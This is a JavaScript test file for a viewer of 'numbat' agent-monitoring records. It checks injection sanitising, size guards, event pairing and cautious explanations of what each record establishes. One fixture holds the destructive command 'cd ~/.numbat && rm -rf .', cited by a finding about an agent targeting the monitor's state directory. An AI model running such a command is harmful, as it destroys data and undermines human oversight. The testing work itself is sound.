  var ip = interpret({ record_type:"finding", rule_id:"x", confidence:Infinity }, {});
  var joined = ip ? JSON.stringify(ip.limits) : "";
  ok("interpret() does not render a non-finite number to the operator",
     joined.indexOf("Infinity") === -1, joined);

  var ru = rollup([ ev("prompt.user", { content_preview:s }) ], "s1");
  eq("rollup() agrees with the others on short strings", ru.prompt, s);

  // Each block carries its own guard, so each needs its own assertion —
  // a mutation in one must not be masked by coverage of another.
  eq("describe() does not render a non-finite number",
     describe({ record_type:"event", event_type:"tool.call", tool_name:Infinity }),
     "Called a tool");
  eq("describe() does not render NaN",
     describe({ record_type:"event", event_type:"tool.call", tool_name:NaN }),
     "Called a tool");
  eq("rollup() does not render a non-finite number",
     rollup([ ev("session.start", { model:Infinity }) ], "s1").model, null);
  eq("rollup() does not render a non-finite hostname",
     rollup([ { record_type:"event", event_type:"file.read",
                endpoint:{ hostname:NaN } } ], "s1").hosts.length, 0);
})();

/* — esc() makes a value safe as an attribute *value*, not as a class *token
     list*: it leaves spaces alone, so a record-derived severity of
     "critical sv-low" would inject a second class token and let a hostile
     finding choose the colour an operator triages by. — */
(function(){
  ok("a class-token sanitiser exists alongside esc()",
     /function cls\(/.test(HTML),
     "expected a cls() helper that strips anything outside [A-Za-z0-9_-]");

  var m = HTML.match(/class="[^"]*?(?:sv-|k-|tag )'\s*\+\s*esc\(/g);
  ok("no record-derived value reaches a class attribute through esc()",
     m === null,
     "these interpolate esc() into a class attribute: " + JSON.stringify(m));

  // The sanitiser itself, lifted from the file and exercised directly.
  var cls = new Function("return " + (HTML.match(/function cls\(v\)\{[\s\S]*?\n  \}/) || [""])[0] + "; ")();
  eq("cls() collapses an injected second class token",
     cls("critical sv-low"), "critical-sv-low");
  eq("cls() strips quotes and angle brackets", cls('a"><b'), "a---b");
  eq("cls() leaves a legitimate severity untouched", cls("critical"), "critical");
  eq("cls() leaves a legitimate record type untouched", cls("scan_summary"), "scan_summary");
  ok("cls() bounds its output", cls(new Array(400).join("x")).length <= 40);
})();

ok("the rollup block does not reference the DOM or viewer globals",
   !/\bdocument\b|\bwindow\b|\brecs\b|\bRULECAT\b|\bview\b/.test(blockSrc("rollup")),
   "rollup() must stay self-contained so it can be lifted and tested alone");

/* ── size guard ─────────────────────────────────────────────────────────── */
(function(){
  // The whole point of the limit: it has to sit BELOW the engine's maximum
  // string length, or it can never fire before the load fails on its own. V8
  // stops at 2^29-24. A limit above that is the bug this guard replaced.
  var V8_MAX_STRING = Math.pow(2,29) - 24;
  ok("MAX_BYTES sits below V8's maximum string length",
     MAX_BYTES < V8_MAX_STRING,
     "MAX_BYTES=" + MAX_BYTES + " must be < " + V8_MAX_STRING + ", or the guard cannot fire first");
  ok("MAX_BYTES is still large enough to be useful", MAX_BYTES > 256*1024*1024);

  eq("overSize() refuses a size past the limit", overSize(MAX_BYTES + 1), true);
  eq("overSize() accepts a size exactly at the limit", overSize(MAX_BYTES), false);
  eq("overSize() accepts an ordinary size", overSize(6499880), false);
  eq("overSize() accepts zero", overSize(0), false);

  // An unknown size must never be treated as a refusal: the caller cannot act
  // on what it was not told, and the load's own failure path still covers it.
  eq("overSize() does not refuse an unknown size", overSize(null), false);
  eq("overSize() does not refuse an undefined size", overSize(undefined), false);
  eq("overSize() does not refuse a numeric string", overSize(String(MAX_BYTES + 1)), false);
  eq("overSize() does not refuse NaN", overSize(NaN), false);
  eq("overSize() does not refuse Infinity", overSize(Infinity), false);

  eq("hdrSize() parses a plain Content-Length", hdrSize("6499880"), 6499880);
  eq("hdrSize() tolerates surrounding whitespace", hdrSize("  6499880 "), 6499880);
  eq("hdrSize() reads zero as zero, not as absent", hdrSize("0"), 0);
  eq("hdrSize() rejects an absent header", hdrSize(null), null);
  eq("hdrSize() rejects a non-string", hdrSize(123), null);
  eq("hdrSize() rejects a negative length", hdrSize("-1"), null);
  eq("hdrSize() rejects a float", hdrSize("1.5"), null);
  eq("hdrSize() rejects a hex-looking value", hdrSize("0x10"), null);
  eq("hdrSize() rejects junk", hdrSize("banana"), null);
  eq("hdrSize() rejects an empty header", hdrSize(""), null);
  // A multi-value Content-Length is a request-smuggling shape; refusing to
  // guess is the only safe reading.
  eq("hdrSize() rejects a duplicated header value", hdrSize("100, 100"), null);

  // The two compose on the served path: header in, refusal out.
  eq("an oversized served stream is refused", overSize(hdrSize(String(MAX_BYTES + 1))), true);
  eq("a normal served stream is not", overSize(hdrSize("6499880")), false);
  eq("a chunked response with no header is not refused", overSize(hdrSize(null)), false);
})();

ok("the sizeguard block does not reference the DOM or viewer globals",
   !/\bdocument\b|\bwindow\b|\brecs\b|\bfetch\b|\bfmtB\b|\btoast\b/.test(blockSrc("sizeguard")),
   "the size guard must stay self-contained so it can be lifted and tested alone");

/* ── explain() — per-event interpretation ───────────────────────────────── */
/*  explain() is the event equivalent of interpret(). It needs sibling records
    — the paired result, the findings that cite it — so it takes an index built
    once by buildIndex(). Both live in the same marked block so the block stays
    self-contained and can be lifted whole.

    Corpus facts these tests encode, each verified against ~/.numbat by jq
    before being written down:
      · four pair shapes join on tool_call_id — command.exec→command.result,
        file.read→tool.result, file.write→tool.result, tool.call→tool.result
      · in all 3,228 pairs the call side precedes the result side in time
      · no record in the reference corpus carries an exit_code at all
      · the only failure signal is the tool_error tag                          */

function exEv(o){ o.record_type = "event"; return o; }
// The index a single record needs when it has no siblings.
var NOIDX = buildIndex([]);

/* — shape and total function — */
(function(){
  /* The division of labour: interpret() owns findings, because a finding is
     explained by the rule catalog. explain() owns the record types explained by
     the records BESIDE them — an event by its result, an enforcement by its
     finding, an indicator by the action its value was lifted out of. */
  eq("explain() declines a finding — interpret() owns those",
     explain({ record_type:"finding", rule_id:"x" }, NOIDX), null);
  ok("explain() handles an indicator",
     !!(explain({ record_type:"indicator", type:"url" }, NOIDX) || {}).what);
  ok("explain() handles an enforcement",
     !!(explain({ record_type:"enforcement", decision:"deny" }, NOIDX) || {}).what);
  eq("explain() declines a record type it has no branch for",
     explain({ record_type:"scan_summary", status:"ok" }, NOIDX), null);
  eq("explain() declines a non-object", explain("nope", NOIDX), null);
  eq("explain() declines null", explain(null, NOIDX), null);
  eq("explain() declines an array", explain([], NOIDX), null);

  var e = explain(exEv({ event_type:"command.exec", command:"ls" }), NOIDX);
  ok("explain() returns an object for an event", e && typeof e === "object");
  ok("explain() always produces a non-empty headline", !!(e && e.what && e.what.length));
  ok("explain() returns findings as an array", !!(e && Array.isArray(e.findings)));
  ok("explain() returns limits as an array", !!(e && Array.isArray(e.limits)));

  // Degrade, never throw. A record with only record_type still explains itself.
  var bare = explain({ record_type:"event" }, NOIDX);
  ok("an event with only record_type still explains itself",
     !!(bare && bare.what && bare.what.length), JSON.stringify(bare));
  ok("an event with only record_type claims no pair", !!(bare && bare.next === null));

  // Every field null — the shape numbat never emits but JSON permits.
  var nulls = explain({ record_type:"event", event_type:null, tool_name:null, command:null,
                        file_path:null, tool_call_id:null, source_type:null, actor:null,
                        confidence:null, sub_agent:null, duration_ms:null, tags:null,
                        event_id:null, model:null }, NOIDX);
  ok("an all-null event still explains itself",
     !!(nulls && nulls.what && nulls.what.length), JSON.stringify(nulls));
  ok("an all-null event claims no pair", !!(nulls && nulls.next === null));

  // A missing or malformed index must not be a crash: the pane still renders.
  ok("explain() tolerates a missing index",
     !!(explain(exEv({ event_type:"command.exec" })) || {}).what);
  ok("explain() tolerates a junk index",
     !!(explain(exEv({ event_type:"command.exec" }), "nope") || {}).what);
})();

/* — the headline, per event type — */
(function(){
  function what(o){ var e = explain(exEv(o), NOIDX); return e ? e.what : null; }

  eq("command.exec names the tool it went through",
     what({ event_type:"command.exec", tool_name:"Bash", command:"npm test" }),
     "The agent proposed a shell command through Bash.");
  eq("command.exec without a tool still states the action",
     what({ event_type:"command.exec", command:"npm test" }),
     "The agent proposed a shell command.");

  eq("command.result reports the duration it carries",
     what({ event_type:"command.result", duration_ms:1500 }),
     "numbat recorded a result for a shell command, reporting a duration of 1.5 s.");
  eq("command.result without a duration claims none",
     what({ event_type:"command.result" }),
     "numbat recorded a result for a shell command.");

  eq("file.read names the path and the tool",
     what({ event_type:"file.read", file_path:"/a/b.txt", tool_name:"Read" }),
     "The agent asked to read /a/b.txt using Read.");
  eq("file.read without a path stays general",
     what({ event_type:"file.read" }), "The agent asked to read a file.");
  eq("file.write names the path and the tool",
     what({ event_type:"file.write", file_path:"/a/b.txt", tool_name:"Edit" }),
     "The agent asked to write /a/b.txt using Edit.");

  eq("tool.call names the tool", what({ event_type:"tool.call", tool_name:"Agent" }),
     "The agent called the Agent tool.");
  eq("tool.call without a tool name stays general",
     what({ event_type:"tool.call" }), "The agent called a tool.");
  // tool.result's headline needs an index — the only things it can say that
  // the row summary cannot come from the record it answers — so it is
  // exercised in its own block below rather than through what().

  eq("session.start names the model when it has one",
     what({ event_type:"session.start", model:"claude-opus-5" }),
     "numbat recorded a start for this session, on model claude-opus-5.");
  eq("session.start without a model states only the boundary",
     what({ event_type:"session.start" }), "numbat recorded a start for this session.");
  eq("session.end states the boundary",
     what({ event_type:"session.end" }), "numbat recorded an end for this session.");

  // numbat maps SubagentStart/Stop onto session.start/end and copies the
  // parent's session_id, so a sub_agent boundary is not this session's own.
  eq("a subagent start says whose boundary it is",
     what({ event_type:"session.start", sub_agent:"Explore" }),
     "numbat recorded the start of a subagent (Explore), which it maps onto session.start.");
  eq("a subagent end says whose boundary it is",
     what({ event_type:"session.end", sub_agent:"Explore" }),
     "numbat recorded the end of a subagent (Explore), which it maps onto session.end.");

  eq("prompt.user states who spoke",
     what({ event_type:"prompt.user" }), "The operator sent a prompt to the agent.");
  eq("message.assistant states who spoke",
     what({ event_type:"message.assistant" }), "The agent sent a message.");

  eq("permission.requested names the tool approval was sought for",
     what({ event_type:"permission.requested", tool_name:"AskUserQuestion" }),
     "The agent asked for approval to use the AskUserQuestion tool.");

  // The generic branch: an event_type added to numbat after this was written.
  eq("an unknown event type is named rather than guessed at",
     what({ event_type:"network.beacon" }), "numbat recorded a network.beacon event.");
  eq("an event with no event_type says so",
     what({ event_type:"" }), "numbat recorded an event with no event_type.");
})();

/* — pairing: the four shapes, present and absent — */
(function(){
  var exec   = exEv({ event_type:"command.exec", event_id:"e1", tool_call_id:"t1",
                    tool_name:"Bash", command:"npm test", source_type:"hook" });
  var result = exEv({ event_type:"command.result", event_id:"e2", tool_call_id:"t1",
                    duration_ms:1500, command:"npm test", source_type:"hook" });
  var idx = buildIndex([exec, result]);

  var a = explain(exec, idx);
  ok("a paired exec reports its result", !!(a.next && /matching command\.result was recorded/.test(a.next.text)), a.next && a.next.text);
  ok("a paired exec reports the duration the result carries", /1\.5 s/.test(a.next.text), a.next.text);
  // The single most important negative claim in the whole feature: a result
  // exists, and that is not the same as the command having worked.
  ok("a paired exec states the outcome is unrecorded",
     /whether the command succeeded is not recorded/.test(a.next.text), a.next.text);
  (function(){
    var rest = a.next.text.replace(/whether the command succeeded is not recorded here/g, "");
    ok("a paired exec makes no other claim about outcome",
       !/fail|succe|error|worked|crash/i.test(rest), rest);
  })();
  eq("a paired exec labels the section forward", a.next.label, "What happened next");

  var b = explain(result, idx);
  eq("a paired result labels the section backward", b.next.label, "What this responds to");
  ok("a paired result points back at the proposing event",
     /matching command\.exec/.test(b.next.text), b.next.text);
  // "earlier" is an ordering claim, so it is checked against file order rather
  // than assumed. It holds for all 3,228 pairs in the reference corpus.
  ok("a result whose exec precedes it says so",
     /recorded earlier in this file/.test(b.next.text), b.next.text);
  ok("the exec, which comes first, makes no 'earlier' claim about its result",
     !/earlier/.test(a.next.text), a.next.text);

  // A file that records the result before the call must not be described as
  // though it did not. numbat has never emitted one; the claim is still checked.
  (function(){
    var rEarly = exEv({ event_type:"command.result", event_id:"r0", tool_call_id:"tz", duration_ms:5 });
    var eLate  = exEv({ event_type:"command.exec", event_id:"e0", tool_call_id:"tz", command:"x" });
    var inverted = buildIndex([rEarly, eLate]);   // result first in file order
    var t = explain(rEarly, inverted).next.text;
    ok("an out-of-order pair drops the 'earlier' claim", !/earlier/.test(t), t);
    ok("an out-of-order pair still reports the pair", /matching command\.exec/.test(t), t);
  })();

  // Unpaired: 13 of 1,973 execs in the reference corpus, 12 of them mid-session.
  var lone = exEv({ event_type:"command.exec", event_id:"e3", tool_call_id:"t9",
                  tool_name:"Bash", command:"pkill -f something", source_type:"hook" });
  var c = explain(lone, buildIndex([lone]));
  ok("an unpaired exec states the absence plainly",
     /No command\.result carrying this tool_call_id appears in this file/.test(c.next.text), c.next.text);
  ok("an unpaired exec does not imply failure",
     /does not show the command failed/.test(c.next.text), c.next.text);
  ok("an unpaired exec does not imply it ran either",
     /does not show it ran/.test(c.next.text), c.next.text);
  // Asserting the honest sentence is present is not enough on its own: a
  // contradicting claim can sit right beside it and still satisfy that test.
  // Strip the sanctioned negations and require that nothing else in the
  // sentence speaks to outcome at all.
  (function(){
    var rest = c.next.text.replace(/does not show the command failed/g, "")
                          .replace(/does not show it ran/g, "");
    ok("an unpaired exec makes no other claim about outcome",
       !/fail|succe|error|complet|crash/i.test(rest), rest);
  })();

  // An event type that cannot be paired at all must not report an absence:
  // there is no tool_call_id to be missing.
  var p = explain(exEv({ event_type:"prompt.user", event_id:"e4" }), NOIDX);
  eq("prompt.user reports no pairing section", p.next, null);
  var se = explain(exEv({ event_type:"session.end", event_id:"e5" }), NOIDX);
  eq("session.end reports no pairing section", se.next, null);

  // file.read / file.write / tool.call all pair with tool.result — the three
  // shapes the brief's two-shape model missed.
  function pairOf(callType, tool){
    var call = exEv({ event_type:callType, event_id:"c1", tool_call_id:"t2",
                    tool_name:tool, file_path:"/a/b.txt" });
    var res  = exEv({ event_type:"tool.result", event_id:"c2", tool_call_id:"t2", tool_name:tool });
    return { call:call, res:res, idx:buildIndex([call, res]) };
  }
  ["file.read", "file.write", "tool.call"].forEach(function(t){
    var P = pairOf(t, "Read");
    ok(t + " pairs with its tool.result",
       /matching tool\.result was recorded/.test(explain(P.call, P.idx).next.text));
    var back = explain(P.res, P.idx);
    eq("tool.result labels the section backward for " + t, back.next.label, "What this responds to");
    ok("tool.result names the " + t + " it answers",
       back.next.text.indexOf(t) !== -1, back.next.text);
  });

  // tool_error is the only failure signal numbat carries, and it is the agent's
  // own flag — say that, and mark it.
  var errRes = exEv({ event_type:"command.result", event_id:"e7", tool_call_id:"t3",
                    duration_ms:20, tags:["tool_error"] });
  var errExec = exEv({ event_type:"command.exec", event_id:"e6", tool_call_id:"t3", command:"false" });
  var d = explain(errExec, buildIndex([errExec, errRes]));
  ok("a result tagged tool_error is surfaced on the exec",
     /tagged tool_error/.test(d.next.text), d.next.text);
  ok("tool_error is attributed to the agent, not to numbat's judgement",
     /the agent itself/.test(d.next.text), d.next.text);
  eq("a tool_error pair is marked for the renderer", d.next.warn, true);
  eq("an ordinary pair is not marked", a.next.warn, false);

  // An exit code is absent from every record in the reference corpus, but the
  // schema permits one. If it is ever there, report it instead of the absence.
  var xExec = exEv({ event_type:"command.exec", event_id:"x1", tool_call_id:"t4", command:"true" });
  var xRes  = exEv({ event_type:"command.result", event_id:"x2", tool_call_id:"t4", exit_code:0 });
  var x = explain(xExec, buildIndex([xExec, xRes]));
  ok("an exit code of 0 is reported when present", /exit code 0/.test(x.next.text), x.next.text);
  ok("an exit code suppresses the no-exit-code caveat",
     !/whether the command succeeded is not recorded/.test(x.next.text), x.next.text);
  var yRes = exEv({ event_type:"command.result", event_id:"y2", tool_call_id:"t5", exit_code:1 });
  var yExec = exEv({ event_type:"command.exec", event_id:"y1", tool_call_id:"t5", command:"false" });
  ok("a non-zero exit code is reported as such",
     /exit code 1/.test(explain(yExec, buildIndex([yExec, yRes])).next.text));

  // A record must never pair with itself, however odd the file.
  var self = exEv({ event_type:"command.exec", event_id:"s1", tool_call_id:"t6", command:"x" });
  ok("a record does not pair with itself",
     /No command\.result/.test(explain(self, buildIndex([self])).next.text));
})();

/* — pairing must name what it FOUND, never what it wanted — */
(function(){
  // A forward branch that prints the expected counterpart type states, as
  // fact, that a record of a type not in the file was recorded.
  var call = exEv({ event_type:"file.read", event_id:"w1", tool_call_id:"tw",
                    file_path:"/a", tool_name:"Read" });
  var odd  = exEv({ event_type:"command.result", event_id:"w2", tool_call_id:"tw", duration_ms:9 });
  var t = explain(call, buildIndex([call, odd])).next.text;
  ok("the pair is named by the type actually found", /matching command\.result/.test(t), t);
  ok("the pair is not named by the type merely expected", !/matching tool\.result/.test(t), t);

  // And the backward branch's verb belongs to the mate, not to the subject:
  // naming a command.result as the record "where the command was proposed"
  // asserts a proposal that record never made.
  var r1 = exEv({ event_type:"command.result", event_id:"v1", tool_call_id:"tv", duration_ms:1 });
  var r2 = exEv({ event_type:"command.result", event_id:"v2", tool_call_id:"tv", duration_ms:2 });
  var bt = explain(r2, buildIndex([r1, r2])).next.text;
  ok("a result paired with another result does not claim a proposal",
     !/where the command was proposed/.test(bt), bt);

  // Several records sharing one key: decline to name one with confidence.
  var e1 = exEv({ event_type:"command.exec", event_id:"z0", tool_call_id:"tq", command:"x" });
  var q1 = exEv({ event_type:"command.result", event_id:"z1", tool_call_id:"tq", duration_ms:1 });
  var q2 = exEv({ event_type:"command.result", event_id:"z2", tool_call_id:"tq", duration_ms:2 });
  var at = explain(e1, buildIndex([e1, q1, q2])).next.text;
  ok("an ambiguous join says so", /Several records share this tool_call_id/.test(at), at);

  // Preference, not position: the right counterpart is chosen even when a
  // same-side record was indexed first.
  var d1 = exEv({ event_type:"command.exec", event_id:"p0", tool_call_id:"tp", command:"a" });
  var d2 = exEv({ event_type:"command.exec", event_id:"p1", tool_call_id:"tp", command:"b" });
  var dr = exEv({ event_type:"command.result", event_id:"p2", tool_call_id:"tp", duration_ms:7 });
  ok("the expected counterpart is preferred over the first one indexed",
     /matching command\.result/.test(explain(d2, buildIndex([d1, d2, dr])).next.text));
})();

/* — an absent join key is not an absent result — */
(function(){
  var noKey = exEv({ event_type:"command.exec", event_id:"n1", command:"ls" });
  var t = explain(noKey, NOIDX).next.text;
  ok("a record with no tool_call_id says so", /carries no tool_call_id/.test(t), t);
  ok("a record with no tool_call_id does not claim a result is missing",
     !/appears in this file/.test(t) && !/no result was recorded/.test(t), t);
})();

/* — outcome fields — */
(function(){
  // exInt rejected a float or a numeric string that describe() renders happily,
  // so the two panes made opposite statements about the same record.
  var ex = exEv({ event_type:"command.exec", event_id:"f1", tool_call_id:"tf", command:"x" });
  var rf = exEv({ event_type:"command.result", event_id:"f2", tool_call_id:"tf", exit_code:1.5 });
  var t = explain(ex, buildIndex([ex, rf])).next.text;
  ok("a non-integer exit code is still reported", /exit code 1\.5/.test(t), t);
  ok("a present exit code is never denied",
     !/carries no exit code/.test(t), t);

  // The renderer's badge is driven by warn, so warn may only be set when the
  // sentence explaining it was actually emitted.
  var rb = exEv({ event_type:"command.result", event_id:"b2", tool_call_id:"tb",
                  exit_code:3, tags:["tool_error"] });
  var eb = exEv({ event_type:"command.exec", event_id:"b1", tool_call_id:"tb", command:"x" });
  var n = explain(eb, buildIndex([eb, rb])).next;
  ok("warn is only set when tool_error is actually explained",
     n.warn === false || /tool_error/.test(n.text), JSON.stringify(n));

  // "only from a field the agent itself set" is false for telemetry records:
  // the project's own README says OTLP can earn the tag from log severity.
  var ro = exEv({ event_type:"command.result", event_id:"o2", tool_call_id:"to",
                  tags:["tool_error"], source_type:"otel" });
  var eo = exEv({ event_type:"command.exec", event_id:"o1", tool_call_id:"to", command:"x" });
  var ot = explain(eo, buildIndex([eo, ro])).next.text;
  ok("a telemetry-sourced tool_error does not claim the agent set it",
     !/only from a field/.test(ot) && /log severity/.test(ot), ot);
  var rh = exEv({ event_type:"command.result", event_id:"h2", tool_call_id:"th",
                  tags:["tool_error"], source_type:"hook" });
  var eh = exEv({ event_type:"command.exec", event_id:"h1", tool_call_id:"th", command:"x" });
  ok("a hook-sourced tool_error keeps the stronger claim",
     /only from a field the agent itself/.test(explain(eh, buildIndex([eh, rh])).next.text));
})();

/* — a paired record is reachable, not merely described — */
(function(){
  var ex = exEv({ event_type:"command.exec", event_id:"j1", tool_call_id:"tj", command:"x" });
  var rs = exEv({ event_type:"command.result", event_id:"j2", tool_call_id:"tj", duration_ms:4 });
  var idx = buildIndex([ex, rs]);
  eq("the exec carries its result's id for linking", explain(ex, idx).next.eventId, "j2");
  eq("the result carries its exec's id for linking", explain(rs, idx).next.eventId, "j1");
  eq("an unpaired record offers no link",
     explain(exEv({ event_type:"command.exec", event_id:"j3", tool_call_id:"tk", command:"x" }),
             idx).next.eventId, "");
})();

/* — the reverse citation index — */
(function(){
  var target = exEv({ event_type:"command.exec", event_id:"cited-1", tool_call_id:"tc",
                    command:"cd ~/.numbat && rm -rf .", source_type:"hook" });
  var finding = { record_type:"finding", finding_id:"fnd-1", rule_id:"tamper.detector_state_write",
                  title:"Agent targeted numbat's default state directory", severity:"high",
                  cited_event_ids:["cited-1"] };
  var idx = buildIndex([target, finding]);

  var e = explain(target, idx);
  eq("a cited event reports exactly one finding", e.findings.length, 1);
  eq("the citation carries the rule id", e.findings[0].rule, "tamper.detector_state_write");
  eq("the citation carries the finding id", e.findings[0].finding, "fnd-1");
  eq("the citation carries the title", e.findings[0].title, "Agent targeted numbat's default state directory");
  eq("the citation carries the severity", e.findings[0].sev, "high");

  // An uncited event must report an empty list, not a fabricated reassurance.
  var other = exEv({ event_type:"command.exec", event_id:"uncited-1", command:"ls" });
  eq("an uncited event reports no findings", explain(other, idx).findings.length, 0);

  // In the reference corpus the reverse index happens to be one-to-one — 9
  // findings, 9 distinct events. Nothing may depend on that.
  var multi = exEv({ event_type:"command.exec", event_id:"m1", command:"x" });
  var f1 = { record_type:"finding", finding_id:"a", rule_id:"r.one", severity:"high", cited_event_ids:["m1"] };
  var f2 = { record_type:"finding", finding_id:"b", rule_id:"r.two", severity:"low",  cited_event_ids:["m1"] };
  eq("two findings citing one event both appear",
     explain(multi, buildIndex([multi, f1, f2])).findings.length, 2);

  // And a finding citing several events reaches all of them.
  var g1 = exEv({ event_type:"command.exec", event_id:"g1", command:"x" });
  var g2 = exEv({ event_type:"command.exec", event_id:"g2", command:"y" });
  var f3 = { record_type:"finding", finding_id:"c", rule_id:"r.three", cited_event_ids:["g1","g2"] };
  var gidx = buildIndex([g1, g2, f3]);
  eq("a finding citing two events reaches the first", explain(g1, gidx).findings.length, 1);
  eq("a finding citing two events reaches the second", explain(g2, gidx).findings.length, 1);

  // Malformed citation lists must not poison the index.
  var h1 = exEv({ event_type:"command.exec", event_id:"h1", command:"x" });
  var bad = { record_type:"finding", finding_id:"d", cited_event_ids:"not-an-array" };
  var bad2 = { record_type:"finding", finding_id:"e", cited_event_ids:[null, 7, {}, "h1"] };
  var hidx = buildIndex([h1, bad, bad2]);
  eq("a non-array citation list is ignored, and valid entries beside it survive",
     explain(h1, hidx).findings.length, 1);
})();

/* — what the record does and does not establish — */
(function(){
  function limits(o){ return explain(exEv(o), NOIDX).limits.join(" | "); }

  // The claim describe() was corrected to stop making, kept consistent here.
  ok("a hook-sourced command.exec says numbat saw it before it ran",
     /numbat saw this before it ran/.test(limits({ event_type:"command.exec", source_type:"hook", command:"x" })));
  ok("a hook-sourced command.exec does not claim execution",
     /does not show whether it executed/.test(limits({ event_type:"command.exec", source_type:"hook", command:"x" })));

  // In all 3,228 pairs in the corpus the call side precedes the result side, so
  // a file.write is the request, not the completed write.
  ok("a file.write is stated as a request, not a completed write",
     /does not show whether the write completed/.test(limits({ event_type:"file.write", source_type:"hook", file_path:"/a" })));
  ok("a file.read is stated as a request too",
     /does not show whether the read completed/.test(limits({ event_type:"file.read", source_type:"hook", file_path:"/a" })));

  ok("an artifact-sourced event says it was reconstructed after the fact",
     /Reconstructed from an on-disk artifact/.test(limits({ event_type:"command.exec", source_type:"artifact" })));
  ok("a telemetry-sourced event says so",
     /Reported by telemetry/.test(limits({ event_type:"command.exec", source_type:"otel" })));

  // The actor claim is specifically that this was a tool call, so it may only
  // be made about one. message.assistant carries actor "assistant" and is the
  // agent writing prose to the operator — not a tool call.
  ok("actor assistant is reported on a tool call",
     /issued this tool call itself/.test(limits({ event_type:"command.exec", actor:"assistant" })));
  ok("the actor claim does not retract itself",
     /does not mean the operator did not ask for it or approve it/.test(
       limits({ event_type:"command.exec", actor:"assistant" })));
  ok("a message is NOT described as a tool call",
     !/tool call/.test(limits({ event_type:"message.assistant", actor:"assistant" })),
     limits({ event_type:"message.assistant", actor:"assistant" }));
  ok("a permission request is NOT described as a tool call",
     !/issued this tool call/.test(limits({ event_type:"permission.requested", actor:"assistant" })));
  ok("actor user carries interpret()'s exact sentence",
     limits({ event_type:"prompt.user", actor:"user" }).indexOf(
       "This came from the operator, not the agent.") !== -1);

  /* confidence gets no bullet. It defines a field rather than saying anything
     about this record, it is "medium" on all 6,715 events in the reference
     corpus, and as the last bullet on 100% of panes it was a quarter of all the
     text this function produced — a constant sitting where the rare real caveat
     lives, training the eye to skip the section. */
  ok("confidence does not produce a caveat bullet",
     !/confidence/.test(limits({ event_type:"command.exec", confidence:"medium" })),
     limits({ event_type:"command.exec", confidence:"medium" }));
  ok("an unusual confidence value still produces no bullet",
     !/confidence/.test(limits({ event_type:"command.exec", confidence:"high" })));

  // The headline names the subagent now, so this only has to say where numbat
  // files the record. It used to take 174 characters on 61% of records.
  ok("a sub_agent record says whose session it lands in",
     /files subagent work under the parent's session_id/.test(
       limits({ event_type:"command.exec", sub_agent:"Explore" })));
  ok("the sub_agent caveat stays short",
     limits({ event_type:"command.exec", sub_agent:"Explore" }).length < 140,
     limits({ event_type:"command.exec", sub_agent:"Explore" }));

  // permission.requested records that approval was asked for, not the answer.
  var pr = limits({ event_type:"permission.requested", tool_name:"AskUserQuestion", decision:"asked" });
  ok("permission.requested does not claim to know the answer",
     /does not record what was answered/.test(pr), pr);

  ok("a redacted event says a value was masked",
     /masked before the record was written/.test(limits({ event_type:"command.exec", redacted:true })));

  // Nothing may be asserted from a field that is absent.
  var quiet = explain(exEv({ event_type:"session.end" }), NOIDX).limits.join(" | ");
  ok("an event with no source_type makes no provenance claim",
     !/saw this before it ran|artifact|telemetry/.test(quiet), quiet);
  ok("an event with no actor makes no actor claim",
     !/issued this as a tool call|came from the operator/.test(quiet), quiet);
  ok("an event with no confidence makes no confidence claim", !/confidence/.test(quiet), quiet);
})();

/* — buildIndex: bounds and hostile input — */
(function(){
  var i0 = buildIndex([]);
  ok("buildIndex([]) returns a usable index", !!(i0 && i0.pair && i0.citedBy));
  ok("buildIndex tolerates a non-array", !!(buildIndex("nope") || {}).pair);
  ok("buildIndex tolerates null", !!(buildIndex(null) || {}).pair);
  ok("buildIndex skips holes and non-objects",
     !!buildIndex([null, 7, "x", undefined, []]).pair);

  // Join keys are record-derived and untrusted. Truncating one could fabricate
  // a pair between two distinct ids, which is worse than reporting no pair — so
  // an over-long key is refused entry instead. Real ids max at 30 characters.
  var huge = new Array(5000).join("k");
  var a = exEv({ event_type:"command.exec", event_id:"ha", tool_call_id:huge + "A", command:"x" });
  var b = exEv({ event_type:"command.result", event_id:"hb", tool_call_id:huge + "B", duration_ms:1 });
  var hidx = buildIndex([a, b]);
  var keys = Object.keys(hidx.pair);
  ok("an over-long tool_call_id is not indexed", keys.length === 0,
     "indexed keys: " + JSON.stringify(keys).slice(0, 200));
  // An over-long key is refused by the index, not missing from the file.
  // Reporting it as an absence would be a fabricated absence — the same class
  // of error as a fabricated pair, stated with the same confidence.
  (function(){
    var t = explain(a, hidx).next.text;
    ok("an over-long id is reported as a viewer limit, not an absence",
       /not in a form this viewer will match on/.test(t), t);
    ok("an over-long id does not claim the counterpart is missing from the file",
       !/appears in this file/.test(t), t);
    ok("an over-long id is not fused with a different over-long id",
       !/A matching/.test(t), t);
  })();

  // A prototype-polluting id must not reach Object.prototype.
  var poison = exEv({ event_type:"command.exec", event_id:"__proto__", tool_call_id:"__proto__", command:"x" });
  var pidx = buildIndex([poison]);
  ok("a __proto__ join key does not pollute the prototype",
     ({}).polluted === undefined && Object.prototype.polluted === undefined);
  ok("a __proto__ event id is still explainable", !!explain(poison, pidx).what);

  var cf = { record_type:"finding", finding_id:"f", cited_event_ids:["__proto__"] };
  buildIndex([cf]);
  ok("a __proto__ citation key does not pollute the prototype",
     Object.prototype.polluted === undefined && !Array.isArray(Object.prototype.cited));
})();

/* — indicator records ──────────────────────────────────────────────────────
   106 of them, and they were the last record type with no interpretation at
   all. The corpus facts that shape this, each verified with jq before being
   written down:
     · every indicator's sample_event_id resolves to a command.exec or a
       command.result, so an indicator is a string lifted out of command TEXT
     · all five sha1 values are git commit hashes — three are commits in this
       very repository, and one is the numbat commit in RULECAT_META
     · the two email values are "git@github.com" (an SSH remote) and
       "noreply@anthropic.com" (a commit-message trailer)
     · the one ipv4 came from `ssh ubuntu@100.100.54.71 …` — a PROPOSED command
     · count is 1 and first_seen === last_seen on all 106
   So the type is a shape guess, and nothing here shows a connection, a
   message, or a file.                                                        */
(function(){
  function ind(o){ o.record_type = "indicator"; return o; }
  function ex(o, idx){ return explain(ind(o), idx || NOIDX); }

  var e = ex({ type:"domain", value:"api.supabase.com", count:1,
               sample_event_id:"s1", sample_session_id:"sess",
               first_seen:"2026-07-31T17:27:09Z", last_seen:"2026-07-31T17:27:09Z" });
  ok("an indicator is explained at all", !!(e && e.what && e.what.length), JSON.stringify(e));
  ok("an indicator is described as an extraction, not an observation",
     /extraction, not an observation/.test(e.what), e.what);
  ok("the load-bearing denial is in the headline, not buried in the caveats",
     /matched this domain in the text of a recorded action/.test(e.what), e.what);
  ok("the headline names the indicator's type", /domain/.test(e.what), e.what);

  // The single most important claim this pane makes.
  var lim = e.limits.join(" | ");
  ok("an indicator denies establishing a connection",
